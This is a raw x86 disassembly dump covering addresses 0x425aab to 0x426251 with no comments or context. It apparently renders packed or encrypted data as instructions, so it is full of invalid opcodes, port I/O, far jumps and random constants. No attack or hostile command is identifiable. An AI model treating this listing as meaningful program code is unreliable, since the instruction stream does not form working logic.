  425aab:	jmp    0x425b12
  425aad:	sbb    bh,BYTE PTR [eax-0x6dddf9a]
  425ab3:	or     al,0xde
  425ab5:	add    BYTE PTR [eax],al
  425ab7:	leave  
  425ab8:	inc    edi
  425ab9:	lock inc edi
  425abb:	cmp    DWORD PTR [ebp+0x2c],edi
  425abe:	sbb    al,0x7
  425ac0:	into   
  425ac1:	cmp    eax,0x92f55d18
  425ac6:	pop    ecx
  425ac7:	test   al,0xa0
  425ac9:	xor    dh,BYTE PTR [ecx+0x1e]
  425acc:	add    edx,DWORD PTR [eax+0x6f]
  425acf:	jo     0x425b3a
  425ad1:	sahf   
  425ad2:	cmp    DWORD PTR [ebx+0x49],0x1a4ce151
  425ad9:	add    BYTE PTR [eax],al
  425adb:	dec    ecx
  425adc:	or     eax,ebp
  425ade:	in     al,0xd2
  425ae0:	push   cs
  425ae1:	sub    BYTE PTR [edi],cl
  425ae3:	mov    bh,0x7e
  425ae5:	and    BYTE PTR [ecx],bl
  425ae7:	jmp    0x9453:0xdd7cd5b
  425aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425aef:	out    dx,eax
  425af0:	lea    esi,[eax+0x8d8ccd]
  425af6:	add    dl,ah
  425af8:	mov    al,0xb3
  425afa:	mov    WORD PTR ds:0x60190000,cs
  425b00:	rol    DWORD PTR [edx-0x7c],cl
  425b03:	jge    0x425b05
  425b05:	add    BYTE PTR ds:0x2c22b64d,dh
  425b0b:	push   ss
  425b0c:	mov    ah,0xff
  425b0e:	cmovp  ebx,DWORD PTR [ebx-0x562ca76d]
  425b15:	cs scas eax,DWORD PTR es:[edi]
  425b17:	jns    0x425b75
  425b19:	push   ecx
  425b1a:	mov    esp,0x578792fa
  425b1f:	mov    ecx,0x193435d5
  425b24:	push   esp
  425b25:	mov    al,ds:0x6f403e64
  425b2a:	add    BYTE PTR [eax],al
  425b2c:	scas   al,BYTE PTR es:[edi]
  425b2d:	pop    ebx
  425b2e:	loop   0x425b40
  425b30:	fild   DWORD PTR [eax-0x6cffffdc]
  425b36:	fcmove st,st(6)
  425b38:	jp     0x425b6e
  425b3a:	pop    edi
  425b3b:	arpl   WORD PTR [esi+0x49],bp
  425b3e:	mov    dh,0xce
  425b40:	sbb    al,0xbf
  425b42:	sbb    dh,bl
  425b44:	jp     0x425b54
  425b46:	adc    DWORD PTR [ebp+0x631ab5d1],edx
  425b4c:	inc    ecx
  425b4d:	mov    ebx,0x40c460
  425b52:	add    BYTE PTR [ebx-0x2f],dh
  425b55:	cmp    dl,al
  425b57:	ins    DWORD PTR es:[edi],dx
  425b58:	add    al,0xa4
  425b5a:	add    BYTE PTR [eax],al
  425b5c:	pusha  
  425b5d:	pop    edx
  425b5e:	or     al,0xcf
  425b60:	add    BYTE PTR [eax],al
  425b62:	or     al,0x40
  425b64:	add    BYTE PTR [eax],al
  425b66:	jns    0x425b9e
  425b68:	push   eax
  425b69:	pop    ss
  425b6a:	aas    
  425b6b:	sbb    al,0xde
  425b6d:	adc    eax,0xbd69a68
  425b72:	jmp    0x425b49
  425b74:	pop    es
  425b75:	in     eax,0x3
  425b77:	retf   
  425b78:	xchg   DWORD PTR [eax+0x48],edx
  425b7b:	inc    edx
  425b7c:	add    BYTE PTR [eax],al
  425b7e:	mov    WORD PTR [edx],?
  425b80:	add    BYTE PTR [eax],al
  425b82:	in     eax,0x2a
  425b84:	adc    DWORD PTR [eax],edx
  425b86:	(bad)  
  425b87:	iret   
  425b88:	(bad)  
  425b89:	push   ebx
  425b8a:	clc    
  425b8b:	jl     0x425b73
  425b8d:	xor    ebx,eax
  425b8f:	aas    
  425b90:	and    BYTE PTR [esi+ebp*8+0x90760e1],ah
  425b97:	fmul   DWORD PTR [edi+0x3c2ed6f0]
  425b9d:	iret   
  425b9e:	dec    ecx
  425b9f:	fdiv   DWORD PTR ds:0xfbecf36d
  425ba5:	adc    eax,0x678fa0f4
  425baa:	out    0x6f,al
  425bac:	lds    edx,FWORD PTR [edi-0x6f4c809b]
  425bb2:	or     BYTE PTR [ebx],dl
  425bb4:	add    BYTE PTR [eax],al
  425bb6:	test   ebx,ebp
  425bb8:	fcomp  QWORD PTR [ecx-0x53]
  425bbb:	das    
  425bbc:	pushf  
  425bbd:	arpl   WORD PTR [ebp-0x23],cx
  425bc0:	dec    esp
  425bc1:	mov    es,WORD PTR [eax]
  425bc3:	add    BYTE PTR ds:0xad7e5dbc,dl
  425bc9:	or     BYTE PTR [ecx+0x0],ch
  425bcc:	add    BYTE PTR [eax+0x7a29537f],dl
  425bd2:	fcomp  QWORD PTR [ebx-0x33]
  425bd5:	pop    eax
  425bd6:	or     ebx,DWORD PTR [ebp+0x3c55fe8]
  425bdc:	mov    ah,0x11
  425bde:	jo     0x425c42
  425be0:	in     eax,0x43
  425be2:	dec    esi
  425be3:	mov    bh,0x47
  425be5:	imul   esp,DWORD PTR [eax],0xda36a5db
  425beb:	pop    ebx
  425bec:	xchg   ecx,eax
  425bed:	or     DWORD PTR [eax+0x2c],edi
  425bf0:	push   eax
  425bf1:	fadd   DWORD PTR [esi+ebp*8-0x65c60000]
  425bf8:	daa    
  425bf9:	jmp    0xf56d9d17
  425bfe:	cmc    
  425bff:	iret   
  425c00:	shl    BYTE PTR [eax+0x950094],cl
  425c06:	add    ch,bh
  425c08:	or     eax,0x1c0863
  425c0d:	add    al,dh
  425c0f:	lea    ecx,[ebx]
  425c11:	xchg   ebp,eax
  425c12:	scas   eax,DWORD PTR es:[edi]
  425c13:	scas   eax,DWORD PTR es:[edi]
  425c14:	test   BYTE PTR [esi],bl
  425c16:	add    BYTE PTR [eax],al
  425c18:	and    ecx,edx
  425c1a:	dec    edi
  425c1b:	push   ebp
  425c1c:	gs in  eax,0xa4
  425c1f:	out    dx,al
  425c20:	jno    0x425c98
  425c22:	xor    DWORD PTR [esi+0x5d],edx
  425c25:	popf   
  425c26:	jecxz  0x425bb2
  425c28:	icebp  
  425c29:	xchg   esi,eax
  425c2a:	test   eax,0xb41e948a
  425c2f:	lea    esi,[esi+ebp*2-0x350a54e3]
  425c36:	dec    ebx
  425c37:	sbb    eax,0x2c016d8
  425c3c:	add    BYTE PTR [eax],al
  425c3e:	jecxz  0x425bed
  425c40:	mov    dl,0x56
  425c42:	arpl   WORD PTR [ebx],si
  425c44:	or     DWORD PTR [ecx+edx*4-0x28],edx
  425c48:	iret   
  425c49:	or     eax,0x9439ada7
  425c4e:	mov    al,ds:0x2c16d8fa
  425c53:	mov    esi,0x28bba8e3
  425c58:	loope  0x425c99
  425c5a:	cmp    edx,DWORD PTR [edx-0x114e195b]
  425c60:	clc    
  425c61:	pop    ebp
  425c62:	push   ebx
  425c63:	out    0x52,al
  425c65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c66:	inc    ecx
  425c67:	xchg   esi,eax
  425c68:	adc    BYTE PTR [esi+ebx*1-0x60cc0000],cl
  425c6f:	fisttp QWORD PTR ds:0xfa4e7706
  425c75:	lods   al,BYTE PTR ds:[esi]
  425c76:	rol    DWORD PTR [edi-0x13],1
  425c79:	xchg   edx,eax
  425c7a:	sbb    eax,0x73c87b
  425c7f:	add    bl,dl
  425c81:	mov    ah,0xf
  425c83:	xlat   BYTE PTR ds:[ebx]
  425c84:	call   ebx
  425c86:	dec    ebp
  425c87:	sub    dh,ah
  425c89:	xlat   BYTE PTR ds:[ebx]
  425c8a:	and    eax,0x168f74b2
  425c8f:	jmp    0x3600:0xe38860
  425c96:	pop    eax
  425c97:	and    DWORD PTR [ebx],edi
  425c99:	xchg   esi,eax
  425c9a:	popf   
  425c9b:	or     bl,BYTE PTR [edi-0xa]
  425c9e:	ja     0x425d05
  425ca0:	sbb    edi,DWORD PTR [ecx]
  425ca2:	xchg   ebx,eax
  425ca3:	cli    
  425ca4:	ror    BYTE PTR [ecx+edi*4+0x67eb0000],1
  425cab:	jge    0x9bc98612
  425cb1:	leave  
  425cb2:	outs   dx,DWORD PTR ds:[esi]
  425cb3:	sbb    cl,BYTE PTR [ebp+0x15]
  425cb6:	sbb    bh,BYTE PTR [ecx-0x4a]
  425cb9:	push   cs
  425cba:	adc    eax,0xffffff8b
  425cbd:	div    al
  425cbf:	mov    WORD PTR ds:0xb8f0000,cs
  425cc5:	hlt    
  425cc6:	je     0x425ceb
  425cc8:	mov    bl,0xec
  425cca:	add    al,0xee
  425ccc:	add    BYTE PTR [eax],al
  425cce:	add    eax,0xa1401e09
  425cd3:	add    BYTE PTR [eax],al
  425cd5:	jae    0x425cb4
  425cd7:	int3   
  425cd8:	jl     0x425cda
  425cda:	add    bh,ch
  425cdc:	sbb    edi,DWORD PTR [edi]
  425cde:	sbb    BYTE PTR [ebx+esi*8],bl
  425ce1:	ins    BYTE PTR es:[edi],dx
  425ce2:	sbb    al,0xb1
  425ce4:	data16 mov al,ss:0xc9485c
  425ceb:	add    BYTE PTR [eax+0x60],cl
  425cee:	add    BYTE PTR [eax],al
  425cf0:	adc    eax,0x36cc
  425cf5:	in     al,dx
  425cf6:	pop    ss
  425cf7:	dec    esp
  425cf8:	or     al,BYTE PTR [eax]
  425cfa:	add    BYTE PTR [edx+0x4b3ef59b],ah
  425d00:	dec    ecx
  425d01:	stos   DWORD PTR es:[edi],eax
  425d02:	je     0x425cef
  425d04:	jne    0x425d2f
  425d06:	out    dx,eax
  425d07:	rol    BYTE PTR [edx+0x3e2176d4],cl
  425d0d:	pop    ebp
  425d0e:	(bad)  
  425d0f:	icebp  
  425d10:	es das 
  425d12:	ins    BYTE PTR es:[edi],dx
  425d13:	sahf   
  425d14:	mov    edi,0xcb36da15
  425d19:	adc    BYTE PTR [eax+0x63],ah
  425d1c:	arpl   WORD PTR [edx-0x5f9e9fa],cx
  425d22:	(bad)  
  425d23:	pushf  
  425d24:	xchg   edx,eax
  425d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d26:	pop    esp
  425d27:	pop    ds
  425d28:	jbe    0x425d1a
  425d2a:	xchg   esp,eax
  425d2b:	test   BYTE PTR [eax+0x7e000068],0xe1
  425d32:	or     eax,0xf89eb8c7
  425d37:	idiv   DWORD PTR [eax+0x79a4b3e7]
  425d3d:	clc    
  425d3e:	dec    ebp
  425d3f:	leave  
  425d40:	fdiv   st(6),st
  425d42:	pop    edi
  425d43:	data16 jle 0x425d55
  425d46:	or     ah,BYTE PTR [eax]
  425d48:	add    ch,0x8b
  425d4b:	outs   dx,DWORD PTR ds:[esi]
  425d4c:	pop    edi
  425d4d:	outs   dx,DWORD PTR ds:[esi]
  425d4e:	ror    BYTE PTR [ebx-0x1],1
  425d51:	aaa    
  425d52:	mov    DWORD PTR [edx],esi
  425d54:	es mov esi,ebx
  425d57:	jbe    0x425d7b
  425d59:	and    al,0x13
  425d5b:	adc    ebp,DWORD PTR [eax]
  425d5d:	sbb    eax,0x859216dc
  425d62:	jge    0x425de3
  425d64:	xor    eax,0xe648dc
  425d69:	add    ch,dh
  425d6b:	push   esi
  425d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6d:	cmp    bl,BYTE PTR [ebx]
  425d6f:	push   0xffffffe4
  425d71:	push   edx
  425d72:	cli    
  425d73:	in     eax,0xe0
  425d75:	and    DWORD PTR [edx+0x6],edi
  425d78:	cmp    BYTE PTR [eax],bl
  425d7a:	fwait
  425d7b:	xchg   dh,ch
  425d7d:	lds    ebx,FWORD PTR [edx+0x1c78130e]
  425d83:	rol    DWORD PTR [edx+0xf],cl
  425d86:	xor    cl,dh
  425d88:	ins    BYTE PTR es:[edi],dx
  425d89:	sub    al,0x94
  425d8b:	mov    ds:0x3ec8a9fe,eax
  425d90:	add    BYTE PTR [eax],al
  425d92:	call   0x8f5:0xaee0988e
  425d99:	test   BYTE PTR [eax],0x0
  425d9c:	sub    BYTE PTR [edi+0x4b83a4a2],ch
  425da2:	jbe    0x425d5a
  425da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425da5:	mov    ds:0xa9dc0513,eax
  425daa:	jmp    0xb3a231a9
  425daf:	sbb    al,0x4
  425db1:	lahf   
  425db2:	add    BYTE PTR [eax],al
  425db4:	jle    0x425dd1
  425db6:	xor    DWORD PTR [ebp+ebp*8+0x9049f71],edi
  425dbd:	add    BYTE PTR [eax],al
  425dbf:	pop    edx
  425dc0:	sbb    eax,DWORD PTR [edx-0x31210764]
  425dc6:	push   edx
  425dc7:	push   es
  425dc8:	dec    ebx
  425dc9:	push   esi
  425dca:	(bad)  
  425dcb:	jmp    0x50f5b60c
  425dd0:	dec    esp
  425dd1:	and    DWORD PTR [eax],eax
  425dd3:	add    BYTE PTR [esi-0x374d558e],bl
  425dd9:	data16 add BYTE PTR [eax],al
  425ddc:	adc    edi,DWORD PTR [eax]
  425dde:	sbb    BYTE PTR [ecx],bh
  425de0:	mov    ebx,0xec4c292d
  425de5:	add    BYTE PTR [eax],al
  425de7:	jmp    0x425e4b
  425de9:	mov    bh,0x8f
  425deb:	sbb    al,0xf3
  425ded:	mov    esi,0x27a59c24
  425df2:	and    dh,BYTE PTR [edx-0x1eea86ba]
  425df8:	ds and dl,dh
  425dfb:	xchg   ebp,eax
  425dfc:	mov    edi,0x897ecb1c
  425e01:	(bad)  
  425e02:	mov    dl,BYTE PTR [edi]
  425e04:	sbb    ecx,DWORD PTR [eax+0x17]
  425e07:	add    BYTE PTR [eax],al
  425e09:	les    ebx,FWORD PTR [eax+eax*1+0x0]
  425e0d:	and    DWORD PTR [eax-0x2fffff6],ecx
  425e13:	jecxz  0x425dac
  425e15:	push   0xffffffa5
  425e17:	loop   0x425dd2
  425e19:	sbb    BYTE PTR [edx],al
  425e1b:	scas   al,BYTE PTR es:[edi]
  425e1c:	sbb    edx,DWORD PTR [ebx+0x19]
  425e1f:	jl     0x425e25
  425e21:	add    al,BYTE PTR [eax]
  425e23:	add    BYTE PTR ds:0x2fe085ab,dh
  425e29:	sti    
  425e2a:	xchg   esp,eax
  425e2b:	adc    DWORD PTR [ebx+0x6],esp
  425e2e:	loope  0x425db8
  425e30:	ret    0x0
  425e33:	mov    WORD PTR [ebx],ss
  425e35:	add    BYTE PTR [eax],al
  425e37:	cmp    al,0xd8
  425e39:	sbb    DWORD PTR [esi+eiz*8],ebx
  425e3c:	cld    
  425e3d:	mov    BYTE PTR [edx+0x0],bl
  425e40:	add    BYTE PTR [ebx-0x13],dh
  425e43:	mov    cl,0x77
  425e45:	jns    0x425ea0
  425e47:	pop    eax
  425e48:	lods   al,BYTE PTR fs:[esi]
  425e4a:	cmp    eax,0x30f9e882
  425e4f:	cs mov ecx,0x75c4
  425e55:	fwait
  425e56:	dec    ecx
  425e57:	jg     0x425e6f
  425e59:	clc    
  425e5a:	adc    esi,DWORD PTR [ecx+0x2b]
  425e5d:	pop    ss
  425e5e:	inc    edi
  425e5f:	repz push ebp
  425e61:	dec    eax
  425e62:	stc    
  425e63:	add    BYTE PTR [eax],al
  425e65:	in     eax,0xc0
  425e67:	xlat   BYTE PTR ds:[ebx]
  425e68:	add    BYTE PTR [eax],al
  425e6a:	ficom  DWORD PTR ds:[ecx]
  425e6d:	cmp    al,0xe7
  425e6f:	xor    al,0x29
  425e71:	cdq    
  425e72:	inc    edx
  425e73:	jge    0x425ede
  425e75:	adc    BYTE PTR [ebx],0x0
  425e78:	add    dl,al
  425e7a:	push   ebp
  425e7b:	es imul esp,edx,0xa608126f
  425e82:	add    BYTE PTR [eax],al
  425e84:	out    0xc,eax
  425e86:	push   es
  425e87:	add    BYTE PTR [eax],al
  425e89:	stc    
  425e8a:	mov    esi,0x7658da09
  425e8f:	sahf   
  425e90:	enter  0xb4,0x0
  425e94:	int3   
  425e95:	repz add BYTE PTR [eax],al
  425e98:	hlt    
  425e99:	pop    edi
  425e9a:	call   0xc5776d30
  425e9f:	or     al,0xef
  425ea1:	add    BYTE PTR [eax],al
  425ea3:	outs   dx,DWORD PTR ds:[esi]
  425ea4:	cmp    esp,ebp
  425ea6:	push   es
  425ea7:	push   eax
  425ea8:	stos   BYTE PTR es:[edi],al
  425ea9:	test   DWORD PTR [ebx],ebx
  425eab:	push   ds
  425eac:	and    ebp,DWORD PTR [ecx+0x362263e4]
  425eb2:	inc    eax
  425eb3:	call   0x267d5eb8
  425eb8:	loopne 0x425f1f
  425eba:	add    BYTE PTR [esi+0x0],bh
  425ebd:	add    BYTE PTR [edi],dl
  425ebf:	xchg   bl,al
  425ec1:	ret    
  425ec2:	ja     0x425eec
  425ec4:	pop    edi
  425ec5:	cmp    DWORD PTR [ebp+0x40],esp
  425ec8:	mov    dl,0x0
  425eca:	add    dl,dl
  425ecc:	inc    eax
  425ecd:	adc    al,BYTE PTR [eax]
  425ecf:	add    bh,dh
  425ed1:	mov    ?,WORD PTR [edx+0xf244]
  425ed7:	mov    al,ds:0xc1e32ea8
  425edc:	mov    edi,0x3ac7036f
  425ee1:	push   ss
  425ee2:	inc    edi
  425ee3:	pushf  
  425ee4:	push   ebp
  425ee5:	test   BYTE PTR [eax+eax*1+0x0],bl
  425ee9:	jge    0x425ec3
  425eeb:	mov    al,ds:0x4404eb
  425ef0:	add    BYTE PTR [edx],al
  425ef2:	shl    BYTE PTR [ebx-0x8],1
  425ef5:	iret   
  425ef6:	xor    esi,0xdf48
  425efc:	adc    BYTE PTR [edx-0x1a],cl
  425eff:	imul   esp,DWORD PTR [esi-0x2],0xc23db13a
  425f06:	mov    esi,0x755cb3bd
  425f0b:	sub    esp,DWORD PTR [eax-0x52]
  425f0e:	out    dx,eax
  425f0f:	test   BYTE PTR [eax+eax*1+0x745c2b00],ah
  425f16:	and    dh,BYTE PTR [ecx-0x6a19c095]
  425f1c:	adc    ecx,DWORD PTR [ebp-0x7c8b023d]
  425f22:	mov    bl,0x28
  425f24:	les    edx,FWORD PTR [ebp+0xed20000]
  425f2a:	pop    edi
  425f2b:	loopne 0x425ed2
  425f2d:	cwde   
  425f2e:	scas   al,BYTE PTR es:[edi]
  425f2f:	lods   eax,DWORD PTR ds:[esi]
  425f30:	in     eax,dx
  425f31:	dec    ebp
  425f32:	je     0x425f9f
  425f34:	jae    0x425fa9
  425f36:	pop    ds
  425f37:	fisubr DWORD PTR [ebx]
  425f39:	aaa    
  425f3a:	ret    0x92d7
  425f3d:	or     al,0x4e
  425f3f:	add    BYTE PTR [eax],al
  425f41:	sbb    dh,cl
  425f43:	dec    DWORD PTR [edx-0x56]
  425f46:	inc    esi
  425f47:	mov    WORD PTR fs:[eax+eax*1],fs
  425f4b:	add    BYTE PTR [edx+0xc840a4],bl
  425f51:	add    dl,ah
  425f53:	retf   
  425f54:	sbb    eax,0x99c8b633
  425f59:	add    BYTE PTR [eax],al
  425f5b:	dec    eax
  425f5c:	in     eax,0x0
  425f5e:	add    ah,cl
  425f60:	fld    DWORD PTR [eax]
  425f62:	add    dh,al
  425f64:	xor    eax,0xe4674f3d
  425f69:	in     eax,dx
  425f6a:	sbb    ebx,0xffffffb1
  425f6d:	lahf   
  425f6e:	mov    esp,0x8419d7c6
  425f73:	rol    BYTE PTR [eax],1
  425f75:	add    BYTE PTR [eax+0x52],al
  425f78:	add    BYTE PTR [eax],al
  425f7a:	outs   dx,BYTE PTR ds:[esi]
  425f7b:	mov    BYTE PTR [ebp+0x60ca0000],cl
  425f81:	out    0xf1,eax
  425f83:	or     DWORD PTR [ebx-0x733b94df],esp
  425f89:	add    BYTE PTR [eax],al
  425f8b:	div    edx
  425f8d:	xor    BYTE PTR cs:[edi],al
  425f90:	rol    BYTE PTR [ecx-0x24],cl
  425f93:	or     DWORD PTR [eax+eiz*2],esi
  425f96:	sbb    eax,0x1ad86b24
  425f9b:	xchg   esi,eax
  425f9c:	js     0x425fcc
  425f9e:	pushf  
  425f9f:	aas    
  425fa0:	sbb    eax,0x3f819117
  425fa5:	add    DWORD PTR [edx],edx
  425fa7:	and    al,0x15
  425fa9:	jge    0x425fc4
  425fab:	cmp    ah,ah
  425fad:	jno    0x425f9e
  425faf:	sti    
  425fb0:	adc    ah,BYTE PTR [edi]
  425fb2:	add    DWORD PTR [eax-0x106d67a8],edx
  425fb8:	adc    al,0x80
  425fba:	outs   dx,DWORD PTR ds:[esi]
  425fbb:	add    BYTE PTR [eax],al
  425fbd:	sti    
  425fbe:	dec    ebp
  425fbf:	mov    esp,0xf7863933
  425fc4:	out    dx,al
  425fc5:	imul   eax,esp,0xef0000ab
  425fcb:	clc    
  425fcc:	xchg   DWORD PTR [ebx+0x2bf46587],ecx
  425fd2:	dec    edi
  425fd3:	push   ss
  425fd4:	cmc    
  425fd5:	stos   BYTE PTR es:[edi],al
  425fd6:	mov    edx,0x5c6ad792
  425fdb:	cs aad 0x8b
  425fde:	inc    edx
  425fdf:	push   0x36
  425fe1:	and    eax,0x7ee59d11
  425fe6:	aas    
  425fe7:	and    ebx,0x6e
  425fea:	(bad)  
  425fec:	inc    DWORD PTR [ebx-0x2]
  425fef:	ret    0x99ef
  425ff2:	or     DWORD PTR [ebx-0x2605515b],ecx
  425ff8:	fisub  WORD PTR [edx]
  425ffa:	jae    0x42606f
  425ffc:	lods   al,BYTE PTR ds:[esi]
  425ffd:	pop    ecx
  425ffe:	push   ebp
  425fff:	retf   
  426000:	xchg   BYTE PTR [edx-0x54],dl
  426003:	and    ecx,edx
  426005:	mov    ds,WORD PTR [si+0x59]
  426009:	jle    0x426035
  42600b:	jg     0x425fed
  42600d:	cwde   
  42600e:	pop    edx
  42600f:	scas   al,BYTE PTR es:[edi]
  426010:	ror    DWORD PTR [edi-0x3ea21d7b],0x69
  426017:	sbb    bl,BYTE PTR [edx]
  426019:	je     0x425fb7
  42601b:	sub    al,0x3
  42601d:	jb     0x42608b
  42601f:	mov    BYTE PTR [eax+0x0],dh
  426022:	add    BYTE PTR [ebx],bh
  426024:	std    
  426025:	and    esi,DWORD PTR [ecx]
  426027:	adc    eax,0x8c4fe3cd
  42602c:	or     DWORD PTR [eax],eax
  42602e:	add    BYTE PTR [esi],ch
  426030:	inc    ecx
  426031:	(bad)  
  426032:	out    dx,al
  426033:	mov    edi,0x8bf8d503
  426038:	cld    
  426039:	mov    ds:0x584323b8,al
  42603f:	add    al,0x76
  426041:	add    BYTE PTR [eax],al
  426043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426044:	in     al,dx
  426045:	shl    DWORD PTR [ecx+0x618817],1
  42604b:	add    ah,ah
  42604d:	xor    ecx,eax
  42604f:	and    eax,0x659a1c09
  426054:	js     0x42607f
  426056:	mov    eax,ds:0x8bceedcf
  42605b:	icebp  
  42605c:	cmp    DWORD PTR [esi-0x21fb6406],ebx
  426062:	add    BYTE PTR [eax],al
  426064:	ins    DWORD PTR es:[edi],dx
  426065:	fs sub ebp,edx
  426068:	dec    ecx
  426069:	lods   eax,DWORD PTR ds:[esi]
  42606a:	addr16 clc 
  42606c:	js     0x4260cf
  42606e:	or     eax,0x32ecb7f3
  426073:	sar    BYTE PTR [ecx],1
  426075:	mov    esp,0x4a8365f0
  42607a:	ins    DWORD PTR es:[edi],dx
  42607b:	sub    eax,0x1ec6c1a4
  426080:	cmp    BYTE PTR [esp+ecx*4+0x4e],ch
  426084:	add    BYTE PTR [eax],al
  426086:	jl     0x4260b0
  426088:	dec    ebp
  426089:	fimul  WORD PTR [edi]
  42608b:	adc    BYTE PTR [eax+0x4b73c6a],bl
  426091:	lock add BYTE PTR [eax],al
  426094:	xchg   ebx,eax
  426095:	inc    ebx
  426096:	xchg   esp,eax
  426097:	xchg   ecx,eax
  426098:	ficomp DWORD PTR [eax+0x9c8d371]
  42609e:	add    BYTE PTR [eax],al
  4260a0:	ss bnd jne 0x426065
  4260a4:	pop    ebp
  4260a5:	scas   eax,DWORD PTR es:[edi]
  4260a6:	push   ss
  4260a7:	jo     0x42603c
  4260a9:	or     ebp,esi
  4260ab:	leave  
  4260ac:	clc    
  4260ad:	sub    al,0xc0
  4260af:	add    eax,0xc3df0000
  4260b4:	add    edi,eax
  4260b6:	stc    
  4260b7:	shr    BYTE PTR [ebp+0x4a130000],0x2a
  4260be:	fisub  DWORD PTR [ecx+0x270eeb94]
  4260c4:	pusha  
  4260c5:	fs pop edx
  4260c7:	mov    BYTE PTR [eax+0x424f0000],al
  4260cd:	jl     0x426137
  4260cf:	sbb    eax,0xcdcf31c9
  4260d4:	out    dx,eax
  4260d5:	push   ss
  4260d6:	xchg   ch,ah
  4260d8:	(bad)  
  4260d9:	outs   dx,BYTE PTR ds:[esi]
  4260da:	sbb    al,0x1d
  4260dc:	and    BYTE PTR [edx+0x0],0x0
  4260e0:	call   0x144f:0xe0b1d595
  4260e7:	adc    edx,0x58ae7590
  4260ed:	arpl   WORD PTR [eax+0x14],dx
  4260f0:	pop    ebp
  4260f1:	jbe    0x42608f
  4260f3:	pop    ebp
  4260f4:	nop
  4260f5:	mov    eax,ebp
  4260f7:	and    ebx,0xffffff93
  4260fa:	cdq    
  4260fb:	mov    ebp,DWORD PTR [edi]
  4260fd:	ds inc esp
  4260ff:	icebp  
  426100:	add    BYTE PTR [eax],al
  426102:	mov    ebp,DWORD PTR [ecx-0x795ec587]
  426108:	(bad)
  42610c:	add    BYTE PTR [eax],ch
  42610e:	out    0x81,eax
  426110:	sub    DWORD PTR gs:[eax-0x66],0xffffffb8
  426115:	loope  0x42615d
  426117:	imul   ecx,DWORD PTR [edx-0x45],0x6c
  42611b:	or     DWORD PTR [ecx+edi*8],eax
  42611e:	add    BYTE PTR [eax],al
  426120:	and    al,0xa5
  426122:	push   edx
  426123:	out    dx,al
  426124:	push   esp
  426125:	push   esi
  426126:	pop    edx
  426127:	cmp    edx,esp
  426129:	fs cld 
  42612b:	stos   DWORD PTR es:[edi],eax
  42612c:	pop    ebp
  42612d:	adc    al,0x7d
  42612f:	cmp    BYTE PTR [edx+ecx*1],ch
  426132:	jle    0x4260fd
  426134:	cmc    
  426135:	cdq    
  426136:	jns    0x4261b0
  426138:	inc    ecx
  426139:	retf   0x9638
  42613c:	scas   eax,DWORD PTR es:[edi]
  42613d:	lock cmp al,0xc3
  426140:	call   0x8522:0xa3e229ce
  426147:	jmp    0x0:0xdc84551f
  42614e:	stos   DWORD PTR es:[edi],eax
  42614f:	xor    al,0xb2
  426151:	std    
  426152:	push   0x2227d670
  426157:	adc    esi,esi
  426159:	fdiv   st,st(4)
  42615b:	xchg   edi,eax
  42615c:	mov    eax,0xcbb81a5
  426161:	mov    BYTE PTR [eax],0x0
  426164:	call   0x9825cee0
  426169:	mov    esp,0x91fa7d26
  42616e:	mov    esi,0xf9e33b4a
  426173:	cwde   
  426174:	xor    DWORD PTR [eax],edi
  426176:	retf   0xcd43
  426179:	pop    cx
  42617b:	mov    al,ds:0x27851ed8
  426180:	sub    al,BYTE PTR [ecx+0x974c3b]
  426186:	add    BYTE PTR [edx-0x64],dl
  426189:	shl    edi,0xe3
  42618c:	jmp    0x42616e
  42618e:	push   eax
  42618f:	push   ss
  426190:	imul   BYTE PTR [ecx+ecx*4+0x39edba17]
  426197:	jecxz  0x4261bb
  426199:	xor    eax,0x5cbcf7f8
  42619e:	aaa    
  42619f:	push   ebp
  4261a0:	mov    ebp,0xa502410e
  4261a5:	lahf   
  4261a6:	sahf   
  4261a7:	xchg   esi,eax
  4261a8:	(bad)  
  4261a9:	out    dx,eax
  4261aa:	imul   eax,DWORD PTR [esi+edi*1-0x15050000],0x74
  4261b2:	in     al,0x58
  4261b4:	aad    0xb2
  4261b6:	repz add ch,BYTE PTR [ebp+0xd]
  4261ba:	push   edi
  4261bb:	mov    edx,0x3d0abd0f
  4261c0:	sbb    eax,0x837cdee5
  4261c5:	pop    ecx
  4261c6:	jbe    0x426237
  4261c8:	ins    DWORD PTR es:[edi],dx
  4261c9:	mov    edi,0x94a79b31
  4261ce:	fcom   DWORD PTR [edi]
  4261d0:	xor    edx,ecx
  4261d2:	cs aam 0x9
  4261d5:	xor    DWORD PTR [edx+0x44cf1b37],edi
  4261db:	push   0xa5d0000
  4261e0:	push   eax
  4261e1:	mov    esi,0x3b8c42f8
  4261e6:	add    BYTE PTR [eax],al
  4261e8:	pop    esp
  4261e9:	pusha  
  4261ea:	inc    esi
  4261eb:	push   ebx
  4261ec:	mov    edi,0x95c4b572
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    DWORD PTR [ecx+0x2a6ed9f0],eax
  4261f9:	not    DWORD PTR [edx]
  4261fb:	pusha  
  4261fc:	xchg   ecx,eax
  4261fd:	cwde   
  4261fe:	mov    eax,0x5927063e
  426203:	and    BYTE PTR [ebx+ebx*2],dl
  426206:	das    
  426207:	mov    edi,DWORD PTR [esi]
  426209:	dec    eax
  42620a:	pop    esp
  42620b:	add    BYTE PTR [eax],al
  42620d:	fs inc eax
  42620f:	add    DWORD PTR [eax],0x33eb2500
  426215:	sub    cl,BYTE PTR [ecx+ebx*2]
  426218:	add    BYTE PTR [eax],al
  42621a:	push   DWORD PTR [edx]
  42621c:	repz mov cl,0x27
  42621f:	sbb    al,0x4c
  426221:	scas   al,BYTE PTR es:[edi]
  426222:	add    BYTE PTR [eax],al
  426224:	inc    esp
  426225:	in     eax,0x0
  426227:	add    BYTE PTR [esi+0x7a802c],ch
  42622d:	add    BYTE PTR [esi-0x5e],dl
  426230:	xchg   edi,eax
  426231:	imul   edx,DWORD PTR [edi],0x67
  426234:	mov    cl,0xe6
  426236:	das    
  426237:	mov    ds:0x6cb15f9b,al
  42623c:	test   BYTE PTR [ebp+0x0],dh
  42623f:	add    BYTE PTR [eax-0x7affffb8],cl
  426245:	mov    esp,0x8e084f7c
  42624a:	add    BYTE PTR [eax],al
  42624c:	push   edi
  42624d:	adc    al,0xdf
  42624f:	and    esi,edi
  426251:	mov    bh,BYTE PTR [esi+0x4022750d]
